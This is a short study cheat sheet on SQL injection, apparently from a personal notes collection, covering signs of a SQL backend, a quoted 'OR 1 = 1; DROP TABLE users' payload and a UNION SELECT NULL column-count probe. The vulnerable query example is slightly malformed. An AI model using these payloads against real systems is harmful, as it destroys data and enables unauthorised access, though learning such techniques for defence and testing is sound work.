<!--
 * This file is part of RS Cheat Sheets.
 *
 * RS Cheat Sheets is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * RS Cheat Sheets is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with RS Cheat Sheets. If not, see <https://www.gnu.org/licenses/>.
 */
-->

[Home](../README.md)

# SQL Injection

How do you know the database is using SQL?
- Error messages(Internal server error)
	- Test inputs with `'` or `"`
- HTTP headers or response bodies
- Look for SQL keywords

Union select sequences?

```SQL
' OR 1 = 1; DROP TABLE users; --

-- Comments might be # instead of --

' OR 1 = 1; DROP TABLE users; #
```

Get imputed into

```SQL
SELECT * FROM users WHERE = ' userInput ';
```

Once you know something is vulnerable to SQL injection, How do you extract information from the database?
- Find all the tables
- Find all the columns in each table
```SQL
' UNION SELECT NULL, NULL, NULL;
```
- If returns true then you know there are 3 columns for that table.